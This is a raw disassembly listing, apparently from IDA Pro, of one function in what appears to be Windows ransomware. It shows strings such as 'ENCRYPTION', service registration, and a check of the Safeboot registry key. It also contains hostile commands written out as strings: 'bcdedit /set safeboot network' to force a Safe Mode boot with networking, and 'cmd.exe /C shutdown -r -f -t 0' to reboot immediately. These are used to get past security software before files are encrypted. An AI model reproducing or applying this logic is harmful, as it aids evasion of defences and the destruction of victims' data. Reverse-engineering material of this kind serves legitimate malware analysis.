.text:002DC5A0 sub_2DC5A0 proc near                    ; CODE XREF: _main:loc_2EDB95↓p
.text:002DC5A0
.text:002DC5A0 ServiceStartTable= SERVICE_TABLE_ENTRYW ptr -40h
.text:002DC5A0 var_38= dword ptr -38h
.text:002DC5A0 var_34= dword ptr -34h
.text:002DC5A0 var_30= dword ptr -30h
.text:002DC5A0 phkResult= dword ptr -2Ch
.text:002DC5A0 var_28= dword ptr -28h
.text:002DC5A0 var_10= dword ptr -10h
.text:002DC5A0 var_C= byte ptr -0Ch
.text:002DC5A0 var_4= dword ptr -4
.text:002DC5A0 arg_4= dword ptr  0Ch
.text:002DC5A0
.text:002DC5A0 ; FUNCTION CHUNK AT .text:00331DB0 SIZE 00000028 BYTES
.text:002DC5A0 ; FUNCTION CHUNK AT .text:00331DDD SIZE 00000027 BYTES
.text:002DC5A0
.text:002DC5A0 push    ebp
.text:002DC5A1 mov     ebp, esp
.text:002DC5A3 push    0FFFFFFFFh
.text:002DC5A5 push    offset SEH_40C5A0
.text:002DC5AA mov     eax, large fs:0
.text:002DC5B0 push    eax
.text:002DC5B1 sub     esp, 34h
.text:002DC5B4 mov     eax, ___security_cookie
.text:002DC5B9 xor     eax, ebp
.text:002DC5BB mov     [ebp+var_10], eax
.text:002DC5BE push    esi
.text:002DC5BF push    edi
.text:002DC5C0 push    eax
.text:002DC5C1 lea     eax, [ebp+var_C]
.text:002DC5C4 mov     large fs:0, eax
.text:002DC5CA push    offset aEncryption              ; "ENCRYPTION"
.text:002DC5CF push    offset unk_359670
.text:002DC5D4 call    sub_2D26D0
.text:002DC5D9 mov     esi, eax
.text:002DC5DB add     esp, 8
.text:002DC5DE mov     ecx, [esi]
.text:002DC5E0 push    0Ah
.text:002DC5E2 mov     ecx, [ecx+4]
.text:002DC5E5 add     ecx, esi
.text:002DC5E7 call    sub_2ED330
.text:002DC5EC movzx   ecx, al
.text:002DC5EF push    ecx
.text:002DC5F0 mov     ecx, esi
.text:002DC5F2 call    sub_2EAB20
.text:002DC5F7 mov     ecx, esi
.text:002DC5F9 call    sub_2E76E0
.text:002DC5FE cmp     dword_357290, 8
.text:002DC605 mov     eax, offset lpServiceName
.text:002DC60A mov     [ebp+ServiceStartTable.lpServiceProc], offset sub_2DFE80
.text:002DC611 cmovnb  eax, lpServiceName
.text:002DC618 mov     [ebp+ServiceStartTable.lpServiceName], eax
.text:002DC61B lea     eax, [ebp+ServiceStartTable]
.text:002DC61E push    eax                             ; lpServiceStartTable
.text:002DC61F mov     [ebp+var_38], 0
.text:002DC626 mov     [ebp+var_34], 0
.text:002DC62D call    ds:StartServiceCtrlDispatcherW
.text:002DC633 test    eax, eax
.text:002DC635 jnz     loc_2DC8B0
.text:002DC63B push    0F003Fh                         ; dwDesiredAccess
.text:002DC640 push    eax                             ; lpDatabaseName
.text:002DC641 push    eax                             ; lpMachineName
.text:002DC642 call    ds:OpenSCManagerW
.text:002DC648 mov     esi, eax
.text:002DC64A test    esi, esi
.text:002DC64C jnz     short loc_2DC69E
.text:002DC64E mov     esi, ds:GetLastError
.text:002DC654 call    esi ; GetLastError
.text:002DC656 cmp     eax, 5
.text:002DC659 jnz     short loc_2DC66F
.text:002DC65B push    offset aPleaseRunProgr          ; "Please run program as admin"
.text:002DC660 push    offset unk_359670
.text:002DC665 call    sub_2D26D0
.text:002DC66A add     esp, 8
.text:002DC66D jmp     short loc_2DC68B
.text:002DC66F ; ---------------------------------------------------------------------------
.text:002DC66F
.text:002DC66F loc_2DC66F:                             ; CODE XREF: sub_2DC5A0+B9↑j
.text:002DC66F call    esi ; GetLastError
.text:002DC671 push    eax
.text:002DC672 push    offset aCantOpenScmMan          ; "Cant open scm manager: "
.text:002DC677 push    offset unk_359670               ; int
.text:002DC67C call    sub_2D26D0
.text:002DC681 add     esp, 8
.text:002DC684 mov     ecx, eax
.text:002DC686 call    sub_2DA700
.text:002DC68B
.text:002DC68B loc_2DC68B:                             ; CODE XREF: sub_2DC5A0+CD↑j
.text:002DC68B push    offset sub_2D4910
.text:002DC690 mov     ecx, eax
.text:002DC692 call    sub_2DA8D0
.text:002DC697 push    0                               ; FileName
.text:002DC699 call    __loaddll
.text:002DC69E
.text:002DC69E loc_2DC69E:                             ; CODE XREF: sub_2DC5A0+AC↑j
.text:002DC69E call    sub_2DF650
.text:002DC6A3 sub     esp, 18h
.text:002DC6A6 mov     ecx, esp
.text:002DC6A8 mov     [ebp+phkResult], esp
.text:002DC6AB push    offset xmmword_3571D4           ; int
.text:002DC6B0 call    sub_2D6BD0
.text:002DC6B5 mov     [ebp+var_4], 0
.text:002DC6BC sub     esp, 18h
.text:002DC6BF mov     ecx, esp
.text:002DC6C1 mov     [ebp+var_30], esp
.text:002DC6C4 push    offset lpServiceName            ; Src
.text:002DC6C9 call    sub_2D6BD0
.text:002DC6CE mov     byte ptr [ebp+var_4], 1
.text:002DC6D2 push    esi                             ; hSCManager
.text:002DC6D3 mov     [ebp+var_4], 0FFFFFFFFh
.text:002DC6DA call    sub_2DC8E0
.text:002DC6DF add     esp, 34h
.text:002DC6E2 test    eax, eax
.text:002DC6E4 jz      loc_2DC87D
.text:002DC6EA push    43h ; 'C'                       ; nIndex
.text:002DC6EC call    ds:GetSystemMetrics
.text:002DC6F2 mov     edi, eax
.text:002DC6F4 push    edi
.text:002DC6F5 push    offset aBootOption              ; "Boot option: "
.text:002DC6FA push    offset unk_359670
.text:002DC6FF call    sub_2D26D0
.text:002DC704 add     esp, 8
.text:002DC707 mov     ecx, eax
.text:002DC709 call    sub_2DA530
.text:002DC70E mov     esi, eax
.text:002DC710 push    0Ah
.text:002DC712 mov     ecx, [esi]
.text:002DC714 mov     ecx, [ecx+4]
.text:002DC717 add     ecx, esi
.text:002DC719 call    sub_2ED330
.text:002DC71E movzx   ecx, al
.text:002DC721 push    ecx
.text:002DC722 mov     ecx, esi
.text:002DC724 call    sub_2EAB20
.text:002DC729 mov     ecx, esi
.text:002DC72B call    sub_2E76E0
.text:002DC730 test    edi, edi
.text:002DC732 jnz     loc_2DC858
.text:002DC738 lea     eax, [ebp+phkResult]
.text:002DC73B push    eax                             ; int
.text:002DC73C push    103h                            ; int
.text:002DC741 push    edi                             ; int
.text:002DC742 push    offset SubKey                   ; "SYSTEM\\CurrentControlSet\\Control\\Saf"...
.text:002DC747 push    80000002h                       ; int
.text:002DC74C call    ds:RegOpenKeyExW
.text:002DC752 test    eax, eax
.text:002DC754 jnz     loc_2DC843
.text:002DC75A sub     esp, 18h
.text:002DC75D mov     ecx, esp
.text:002DC75F mov     [ebp+var_30], esp
.text:002DC762 push    offset lpServiceName            ; Src
.text:002DC767 call    sub_2D6BD0
.text:002DC76C mov     [ebp+var_4], 2
.text:002DC773 push    [ebp+phkResult]                 ; hKey
.text:002DC776 mov     [ebp+var_4], 0FFFFFFFFh
.text:002DC77D call    sub_2DCEE0
.text:002DC782 add     esp, 1Ch
.text:002DC785 test    al, al
.text:002DC787 jz      loc_2DC81E
.text:002DC78D push    offset aBcdeditSetSafe          ; "bcdedit /set safeboot network"
.text:002DC792 call    sub_30DC04
.text:002DC797 push    offset aCWindowsSystem          ; "C:\\Windows\\System32\\bcdedit.exe /set"...
.text:002DC79C call    sub_30DC04
.text:002DC7A1 push    offset aCWindowsSysnat          ; "C:\\Windows\\SysNative\\bcdedit.exe /se"...
.text:002DC7A6 call    sub_30DC04
.text:002DC7AB lea     eax, [ebp+var_28]
.text:002DC7AE push    eax                             ; int
.text:002DC7AF call    sub_2DFCB0
.text:002DC7B4 add     esp, 10h
.text:002DC7B7 mov     [ebp+var_4], 3
.text:002DC7BE mov     ecx, offset unk_357294
.text:002DC7C3 push    eax                             ; int
.text:002DC7C4 call    sub_2DA440
.text:002DC7C9 mov     [ebp+var_4], 0FFFFFFFFh
.text:002DC7D0 lea     ecx, [ebp+var_28]               ; void *
.text:002DC7D3 call    sub_2D9620
.text:002DC7D8 sub     esp, 18h
.text:002DC7DB mov     ecx, esp
.text:002DC7DD mov     [ebp+var_30], esp
.text:002DC7E0 push    offset unk_357294               ; Src
.text:002DC7E5 call    sub_2D6BD0
.text:002DC7EA mov     [ebp+var_4], 4
.text:002DC7F1 mov     [ebp+var_4], 0FFFFFFFFh
.text:002DC7F8 call    sub_2E0280
.text:002DC7FD add     esp, 18h
.text:002DC800 push    edi                             ; nShowCmd
.text:002DC801 push    edi                             ; lpDirectory
.text:002DC802 push    offset Parameters               ; "/C shutdown -r -f -t 0"
.text:002DC807 push    offset File                     ; "cmd.exe"
.text:002DC80C push    offset Operation                ; "open"
.text:002DC811 push    edi                             ; hwnd
.text:002DC812 call    ds:ShellExecuteA
.text:002DC818 push    edi                             ; FileName
.text:002DC819 call    __loaddll
.text:002DC81E
.text:002DC81E loc_2DC81E:                             ; CODE XREF: sub_2DC5A0+1E7↑j
.text:002DC81E push    offset sub_2D4910
.text:002DC823 push    offset aErrorWhileAddi          ; "Error while adding service to autostart"
.text:002DC828 push    offset unk_359670
.text:002DC82D call    sub_2D26D0
.text:002DC832 add     esp, 8
.text:002DC835 mov     ecx, eax
.text:002DC837 call    sub_2DA8D0
.text:002DC83C push    0                               ; FileName
.text:002DC83E call    __loaddll
.text:002DC843
.text:002DC843 loc_2DC843:                             ; CODE XREF: sub_2DC5A0+1B4↑j
.text:002DC843 push    2E0h
.text:002DC848 push    eax                             ; dwMessageId
.text:002DC849 call    sub_2DEA60
.text:002DC84E add     esp, 8
.text:002DC851 push    0                               ; FileName
.text:002DC853 call    __loaddll
.text:002DC858
.text:002DC858 loc_2DC858:                             ; CODE XREF: sub_2DC5A0+192↑j
.text:002DC858 push    offset sub_2D4910
.text:002DC85D push    offset aThisProgramNee          ; "This program need to be service"
.text:002DC862 push    offset unk_359670
.text:002DC867 call    sub_2D26D0
.text:002DC86C add     esp, 8
.text:002DC86F mov     ecx, eax
.text:002DC871 call    sub_2DA8D0
.text:002DC876 push    0                               ; FileName
.text:002DC878 call    __loaddll
.text:002DC87D
.text:002DC87D loc_2DC87D:                             ; CODE XREF: sub_2DC5A0+144↑j
.text:002DC87D push    offset sub_2D4910
.text:002DC882 call    ds:GetLastError
.text:002DC888 push    eax
.text:002DC889 push    offset aErrorWhileCrea          ; "Error while creating service: "
.text:002DC88E push    offset unk_359670
.text:002DC893 call    sub_2D26D0
.text:002DC898 add     esp, 8
.text:002DC89B mov     ecx, eax
.text:002DC89D call    sub_2DA700
.text:002DC8A2 mov     ecx, eax
.text:002DC8A4 call    sub_2DA8D0
.text:002DC8A9 push    0                               ; FileName
.text:002DC8AB call    __loaddll
.text:002DC8B0
.text:002DC8B0 loc_2DC8B0:                             ; CODE XREF: sub_2DC5A0+95↑j
.text:002DC8B0 push    offset sub_2D4910
.text:002DC8B5 push    offset aStartedAsServi          ; "started as service"
.text:002DC8BA push    offset unk_359670
.text:002DC8BF call    sub_2D26D0
.text:002DC8C4 add     esp, 8
.text:002DC8C7 mov     ecx, eax
.text:002DC8C9 call    sub_2DA8D0
.text:002DC8CE push    0                               ; FileName
.text:002DC8D0 call    __loaddll
.text:002DC8D0 sub_2DC5A0 endp ; sp-analysis failed
.text:002DC8D0
